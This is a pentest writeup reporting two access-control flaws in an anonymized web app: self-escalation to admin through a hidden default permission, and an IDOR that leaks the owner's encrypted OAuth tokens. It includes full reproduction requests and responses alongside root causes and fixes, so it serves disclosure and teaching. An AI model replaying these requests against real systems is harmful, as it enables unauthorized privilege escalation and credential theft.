---
title: Default Hidden Permission Grant Leading to Self-Privilege Escalation & OAuth
  Token Disclosure
description: During a penetration testing engagement as part of my internship, I found
  a hidden permission that enabled self-privilege escalation and disclosure of Super Admin OAuth tokens.
date: 2026-08-26
tags:
- broken-access-control
- privilege-escalation
- idor
- api-security
- pentest
image: /assets/img/posts/target-privilege-escalation-oauth-idor/cover.png
categories:
- Writeups
- Pentest
author: tr3m0x
permalink: /blog/writeups/pentest/target-privilege-escalation-oauth-idor/
last_modified_at: '2026-09-02T08:10:32+01:00'
---

During a penetration testing engagement as part of my internship, I found a critical chain of access control vulnerabilities in **target.com**.

I traced both findings to a default backend flaw: newly invited accounts received the hidden `"createEditDeleteUsers": true` permission. This permission enabled two forms of access control bypass:

1. **Self-Privilege Escalation:** Low-privileged users (such as Project Managers or Employees) could modify their own profile attributes via `PUT /api/team` to elevate their role to `"admin"` (Super Admin level).
2. **IDOR & OAuth Token Disclosure:** The same user management privilege allowed lower-privileged accounts to issue `PUT /api/team` requests targeting the Super Administrator profile, triggering an IDOR response that leaked sensitive third-party Google Drive and Google Calendar OAuth access and refresh tokens.

In this writeup, I explain how I investigated the permission flaw, reproduced both findings, and analyzed their root causes. I also share the remediation measures I recommend.

---

## Executive Summary & Engagement Overview

* **Penetration Tester:** Laith Gritli (`tr3m0x`)
* **Engagement Context:** Penetration testing during my internship.
* **Target Application:** `target.com`
* **Testing Period:** 10/08/2026 – 26/08/2026
* **Environment Tested:** Pre-Production / Staging
* **Report Scope:** Anonymized penetration test report focusing on authorization flaws within `target.com`.

---

## Vulnerability Chain Analysis

```
+-----------------------------------------------------------------------------------+
| Initial State: Super Admin invites a restricted user (all optional permissions OFF)|
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
| Backend Default Flaw: Injects "createEditDeleteUsers": true into user permission  |
+-----------------------------------------------------------------------------------+
                                          |
                        +-----------------+-----------------+
                        |                                   |
                        v                                   v
+-----------------------------------------------+ +-----------------------------------------------+
| Finding 1: Self-Privilege Escalation          | | Finding 2: IDOR & OAuth Token Leak            |
| - User sends PUT /api/team on self ID         | | - User sends PUT /api/team on Owner ID        |
| - Server checks createEditDeleteUsers == true | | - Server checks createEditDeleteUsers == true |
| - Elevates role to systemAccessRole: "admin"  | | - Discloses Super Admin Google OAuth Tokens   |
+-----------------------------------------------+ +-----------------------------------------------+
```

While reviewing the application's RBAC model, I found that its default permissions did not follow the principle of least privilege. When an organization's owner or Super Admin provisions a new team account, the UI presents granular toggle switches for various permissions. However, behind the scenes, the backend hardcodes `"createEditDeleteUsers": true` into every new user record by default.

Because the backend relies solely on `createEditDeleteUsers` to authorize requests to `PUT /api/team` without verifying **who** is being modified or **what** roles are being granted, any user can:
- Elevate their own profile to full administrative status (Finding 1).
- Retrieve and inspect the full profile of the Super Administrator, leaking sensitive OAuth credentials (Finding 2).

---

##  Finding 1 — Default Hidden Permission Grant Leading to Self-Privilege Escalation

**Severity:** High  
**Category:** Broken Access Control / Privilege Escalation  
**CWE:**
- CWE-269 – Improper Privilege Management
- CWE-276 – Incorrect Default Permissions
- CWE-863 – Incorrect Authorization

---

### Description

I started by testing the invitation workflow for new team members. The interface let me configure granular permissions, but I found that even with every optional permission disabled, newly invited accounts still received `"createEditDeleteUsers": true` by default.

This permission is neither displayed nor toggleable within the frontend user management interface. Consequently, any newly invited account—regardless of how restricted their intended profile is—is silently endowed with user-management privileges.

Because the invited user possesses `createEditDeleteUsers: true`, they can subsequently issue an authorized `PUT /api/team` request targeting their own user record to:
1. Toggle all granular permissions to `true`.
2. Elevate their `systemAccessRole` directly to `"admin"`.

Changing `systemAccessRole` to `"admin"` grants the user administrative privileges equivalent to a Super Administrator, allowing them to perform virtually any operational action across the application (managing team members, altering schedules, accessing all reports, approving time corrections, modifying project folders, and viewing GPS tracking data).

> **Note on Owner-Level Separation:** While elevating to the `admin` role provides full administrative operational authority equivalent to a Super Admin, certain root-level capabilities remain restricted to the actual account **Owner** (e.g., subscription and billing management, workspace ownership transfer, and core tenant deletion). These owner-tier functions cannot be accessed or executed through the escalated `admin` role alone.

---

### Impact

* **Vertical Privilege Escalation & Role Elevation:** A low-privileged or restricted account (e.g., Project Manager or Employee) can unilaterally elevate their permissions to full administrative access and promote their `systemAccessRole` to `"admin"` (Super Admin level).
* **Complete RBAC Bypass:** Any restrictions imposed by the organization's Super Administrator during onboarding are nullified, granting the user broad control over organizational data, schedules, GPS tracking, payroll/pay rates, folders, and reports.
* **Unauthorized Access & Control:** Upon self-escalation, the user obtains unrestricted access across operational modules, with only exclusive Owner-tier functions remaining out of reach.

---

### Attack Scenario

1. Using the Super Administrator account, I invited a new team member with the `Project Manager` role and disabled all optional permissions in the interface.
2. I noticed that the invitation request (`POST /api/team/invite`) still included `"createEditDeleteUsers": true` in the permission object.
3. I completed account setup and logged in to `target.com` as the invited user.
4. Using that session, I sent a `PUT /api/team` request with my test account's user ID, set `"systemAccessRole": "admin"`, and enabled all permission flags (`viewPayRate`, `modifyScheduleAnyUser`, `viewReportsAll`, `viewEmployeesGps`, etc.).
5. I received a successful response showing that my test account had been promoted to `admin`. The backend had accepted the self-elevation without enforcing the expected role restrictions.

---

### Steps to Reproduce

#### Step 1 — Invite a restricted user via the management dashboard

Using the Super Administrator account, I sent an invitation with all optional permissions toggled off in the interface.

**Request**

```http
POST /api/team/invite HTTP/2
Host: target.com
Cookie: onboarding_complete=1; firebase-auth-token=<SUPER_ADMIN_AUTH_TOKEN>
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://target.com
Referer: https://target.com/team

{
  "firstName": "Manager",
  "lastName": "1",
  "nickname": "",
  "role": "Project Manager",
  "employmentStatus": "Active",
  "phone": "",
  "email": "manager1@example.com",
  "birthday": "",
  "startDate": "",
  "tags": [],
  "avatarUrl": "",
  "notes": "",
  "hasSystemAccess": true,
  "systemAccessRole": "project_manager",
  "permissions": {
    "createEditDeleteUsers": true,
    "viewPayRate": false,
    "manageProjectFolders": false,
    "uploadRequestFiles": false,
    "clockInOut": false,
    "viewEmployeesGps": false,
    "submitTimeCorrections": false,
    "approveDenyCorrections": false,
    "viewEditAllSchedules": false,
    "modifyScheduleAnyUser": false,
    "viewReportsAll": false
  },
  "allowedProjectIds": [],
  "emailSignature": "",
  "socialBadges": []
}
```

> **Note:** I noticed that the payload included `"createEditDeleteUsers": true` even though I had not selected any user-management permissions in the interface.

---

#### Step 2 — Authenticate as the invited user and escalate role & permissions

After registering, I logged in as the invited user and sent a `PUT /api/team` request targeting my test account. I changed `"systemAccessRole"` to `"admin"` and set all administrative permission flags to `true`.

**Request**

```http
PUT /api/team HTTP/2
Host: target.com
Cookie: firebase-auth-token=<MANAGER_AUTH_TOKEN>
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://target.com
Referer: https://target.com/team

{
  "id": "<MANAGER_USER_ID>",
  "firstName": "Manager",
  "lastName": "1",
  "nickname": "",
  "role": "Project Manager",
  "customRoleId": null,
  "payRate": null,
  "employmentStatus": "Active",
  "phone": "",
  "email": "manager1@example.com",
  "birthday": "",
  "startDate": "",
  "tags": [],
  "avatarUrl": "",
  "notes": "",
  "hasSystemAccess": true,
  "systemAccessRole": "admin",
  "permissions": {
    "createEditDeleteUsers": true,
    "viewPayRate": true,
    "manageProjectFolders": true,
    "uploadRequestFiles": true,
    "clockInOut": true,
    "viewEmployeesGps": true,
    "submitTimeCorrections": true,
    "approveDenyCorrections": true,
    "viewEditAllSchedules": true,
    "modifyScheduleAnyUser": true,
    "viewReportsAll": true
  },
  "allowedProjectIds": [
    "<ALLOWED_PROJECT_ID>"
  ],
  "emailSignature": "",
  "socialBadges": []
}
```

---

#### Step 3 — Verify successful role & permission escalation

I verified the escalation in the HTTP `200 OK` response: the backend returned `systemAccessRole: "admin"` with all permissions active.

**Response**

```http
HTTP/2 200 OK
Date: Sat, 15 Aug 2026 09:39:59 GMT
Content-Type: application/json
Server: cloudflare
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Xss-Protection: 1; mode=block

{
  "success": true,
  "data": {
    "_id": "<MANAGER_USER_ID>",
    "owner_id": "<SUPER_ADMIN_UID>",
    "firebase_uid": "<MANAGER_FIREBASE_UID>",
    "firstName": "Manager",
    "lastName": "1",
    "email": "manager1@example.com",
    "role": "Project Manager",
    "customRoleId": null,
    "systemAccessRole": "admin",
    "hasSystemAccess": true,
    "permissions": {
      "createEditDeleteUsers": true,
      "viewPayRate": true,
      "manageProjectFolders": true,
      "uploadRequestFiles": true,
      "clockInOut": true,
      "viewEmployeesGps": true,
      "submitTimeCorrections": true,
      "approveDenyCorrections": true,
      "viewEditAllSchedules": true,
      "modifyScheduleAnyUser": true,
      "viewReportsAll": true
    },
    "allowedProjectIds": [
      "<ALLOWED_PROJECT_ID>"
    ],
    "payRate": null,
    "employmentStatus": "Active",
    "tags": [],
    "notes": "",
    "status": "Active",
    "joinedAt": "2026-08-15T09:15:59.583Z",
    "createdAt": "2026-08-15T09:15:59.583Z",
    "avatarUrl": "",
    "birthday": "",
    "emailSignature": "",
    "isActive": true,
    "nickname": "",
    "phone": "",
    "socialBadges": [],
    "startDate": "",
    "updatedAt": "2026-08-15T09:39:59.214Z",
    "id": "<MANAGER_USER_ID>"
  }
}
```

---

### Root Cause

1. **Insecure Default Permissions:** The application backend defaults `"createEditDeleteUsers"` to `true` when creating new user profiles without exposing this permission in the frontend UI or adhering to least privilege principles.
2. **Missing Self-Elevation & Role Modification Protections:** The `PUT /api/team` endpoint does not enforce authorization checks to prevent users from modifying their own permission sets or elevating their `systemAccessRole` (e.g., to `"admin"`).

---

### Recommendations

I recommend the following changes to address this finding:

- **Apply Least Privilege by Default:** Set `"createEditDeleteUsers"` to `false` by default for all newly created roles unless explicitly assigned by an authorized Super Administrator.
- **Prevent Self-Permission & Role Modification:** Enforce server-side checks preventing users from editing their own permission flags or elevating their own role/`systemAccessRole`.
- **Enforce Hierarchical RBAC:** Ensure that a user cannot assign permissions or roles that exceed their own verified authorization scope.
- **Audit Existing User Permissions:** Review existing team member records to revoke unintended `createEditDeleteUsers` privileges.

---

## Finding 2 — Insecure Direct Object Reference (IDOR) on Super Administrator Profile Disclosing Sensitive OAuth Tokens

**Severity:** Critical  
**Category:** Broken Access Control / Sensitive Data Exposure / IDOR  
**CWE:**
- CWE-284 – Improper Access Control
- CWE-200 – Exposure of Sensitive Information to an Unauthorized Actor

---

### Description

I then investigated whether the same hidden `"createEditDeleteUsers": true` permission allowed a lower-privileged account to target other users through `PUT /api/team`.

I sent a `PUT /api/team` payload targeting the organization's Super Administrator (`"id": "owner-<SUPER_ADMIN_UID>"`) and found that the backend accepted the request without checking whether my test account could access owner-level records. The authorization check does not enforce a privilege hierarchy, allowing lower-privileged users to access higher-privileged resources. In the resulting HTTP `200 OK` response body, the API serializes and discloses the entire Super Administrator account object, including sensitive third-party OAuth access and refresh credentials for integrated services such as Google Drive and Google Calendar.

---

### Impact

- **Third-Party Service & Account Takeover:** Third-party OAuth access and refresh tokens (such as `google_drive_access_token`, `google_drive_refresh_token`, `google_calendar_access_token`, `google_calendar_refresh_token`) are disclosed to unauthorized users. This enables account takeover of the organization owner's connected Google Drive and Google Calendar accounts, granting access to private cloud storage files, documents, calendar events, and client appointments.
- **Sensitive Information Disclosure:** Exposes administrative metadata, including primary account email address, connected cloud storage provider configurations (`active_storage_provider: target-drive`), internal folder IDs, subscription plan identifiers, and OAuth provider information.
- **Privilege Escalation / Account Tampering:** Callers with user-management privileges can modify or impersonate the Super Administrator account due to the lack of role-based authorization enforcement.

---

### Attack Scenario

1. I logged in to `target.com` with an invited, lower-privileged account that had `createEditDeleteUsers: true`.
2. I identified the Super Administrator's identifier (`owner-<SUPER_ADMIN_UID>`) through API enumeration.
3. I sent a `PUT /api/team` request targeting the owner's ID.
4. I received the full Super Administrator record, including the Google Drive and Google Calendar OAuth token fields, despite using a lower-privileged account.
5. I identified the disclosure as a risk to the owner's connected cloud services. The response shown below contains encrypted token values; accessing those services would also require usable credentials.

---

### Steps to Reproduce

#### Step 1 — Submit a `PUT /api/team` request targeting the Owner record

I used the lower-privileged account's session to send the following request with the owner's identifier.

**Request**

```http
PUT /api/team HTTP/2
Host: target.com
Cookie: onboarding_complete=1; firebase-auth-token=<MANAGER_AUTH_TOKEN>
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://target.com
Referer: https://target.com/team

{
  "id": "owner-<SUPER_ADMIN_UID>"
}
```

---

#### Step 2 — Intercept response containing OAuth tokens and owner secrets

I inspected the successful response and found owner-level account details and OAuth token fields that should not have been returned to my test account.

**Response**

```http
HTTP/2 200 OK
Date: Sun, 16 Aug 2026 09:32:17 GMT
Content-Type: application/json
Server: cloudflare
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Xss-Protection: 1; mode=block

{
  "success": true,
  "data": {
    "_id": "<OWNER_RECORD_ID>",
    "firebase_uid": "<SUPER_ADMIN_UID>",
    "email": "owner@example.com",
    "name": "Super Administrator",
    "photo_url": "https://lh3.googleusercontent.com/a/<AVATAR_ID>",
    "provider": "google",
    "created_at": "2026-08-11T01:22:59.700Z",
    "updated_at": "2026-08-16T09:25:53.703Z",
    "last_active": "2026-08-16T08:58:11.327Z",
    "role": "admin",
    "subscription_status": "trial",
    "plan_id": "<PLAN_ID>",
    "email_verified": true,
    "plan_selected": "trial",
    "plan_selected_at": "2026-08-13T11:15:46.498Z",
    "active_storage_provider": "target-drive",
    "folder_selected_at": "2026-08-13T11:16:21.889Z",
    "google_drive_folder_id": null,
    "google_drive_folder_name": null,
    "google_drive_access_token": "enc:992ba03f374e66ed19f586076857dcd8:b0bb943e8512301822ce0d8671f591ca:<ENCRYPTED_ACCESS_TOKEN>",
    "google_drive_connected": true,
    "google_drive_refresh_token": "enc:eb130535cccc45437e334e9f3cb36f2f:bf11aa129d0aab16bf76feee5acb0369:<ENCRYPTED_REFRESH_TOKEN>",
    "target_drive_folder_id": "root",
    "target_drive_folder_name": "Target Drive",
    "onedrive_folder_id": null,
    "onedrive_folder_name": null,
    "google_calendar_access_token": "enc:113da03f374e66ed19f586076857dcd8:a0aa943e8512301822ce0d8671f591ca:<ENCRYPTED_ACCESS_TOKEN>",
    "google_calendar_connected": true,
    "google_calendar_refresh_token": "enc:fa130535cccc45437e334e9f3cb36f2f:af11aa129d0aab16bf76feee5acb0369:<ENCRYPTED_REFRESH_TOKEN>",
    "google_calendar_token_expiry": "2026-08-13T12:34:24.007Z",
    "birthday": "",
    "emailSignature": "",
    "firstName": "Super",
    "lastName": "Admin",
    "nickname": "",
    "notes": "",
    "phone": "",
    "socialBadges": [],
    "startDate": "",
    "tags": [],
    "id": "owner-<SUPER_ADMIN_UID>"
  }
}
```

---

### Root Cause

1. **Absence of Privilege Hierarchy Validation:** The `/api/team` endpoint implements a basic permission check (`createEditDeleteUsers: true`) but fails to enforce role-based authorization or ownership hierarchy. The backend does not verify that the requester has authorization to access records with a higher privilege level (e.g., owner-level accounts).
2. **Overly Permissive Authorization Model:** The `createEditDeleteUsers` permission grants access to all user records without scoping or restricting modifications to same-level or lower-level accounts.
3. **Sensitive Credential Exposure in API Responses:** OAuth access and refresh tokens are stored directly on the user object and automatically serialized into all API responses without field-level sanitization or response filtering.

---

### Recommendations

I recommend the following changes to address this finding:

1. **Implement Strict Authorization Checks:** Enforce a privilege hierarchy that prevents lower-privileged roles from accessing or modifying higher-privileged records. Owner accounts (`owner-*`) should only be accessible to the account owner or system administrators with explicit owner-level permissions.
2. **Sanitize API Responses:** Implement field-level filtering in the API serialization layer to exclude sensitive fields (`google_drive_access_token`, `google_drive_refresh_token`, `google_calendar_access_token`, `google_calendar_refresh_token`, and similar credential fields) from all API responses by default.
3. **Separate Secret Storage:** Move OAuth tokens, API keys, and other third-party credentials to a dedicated, encrypted credentials vault with strict access control policies. Implement a separate service or endpoint for credential access that enforces stricter authorization and logging.
4. **Add Authorization Logging:** Log all attempts to access or modify owner-level records, including failed authorization attempts, for security monitoring and incident investigation.
5. **Use Scoped Permissions:** Replace broad permission flags like `createEditDeleteUsers` with scoped permissions such as `canEditTeamMembers` that explicitly define which user roles can be modified.

---

## Key Takeaways

During this internship engagement, I found that a single default permission (`createEditDeleteUsers: true`) could undermine the application's authorization model. Following that permission through the API led me to both self-privilege escalation and disclosure of owner-level account data.

By failing to apply default-deny principles during user invitation and omitting privilege hierarchy checks on sensitive API endpoints like `PUT /api/team`, the system allowed low-privileged users to escalate themselves to full Super Admin operational control and extract sensitive third-party OAuth tokens belonging to the organization owner.
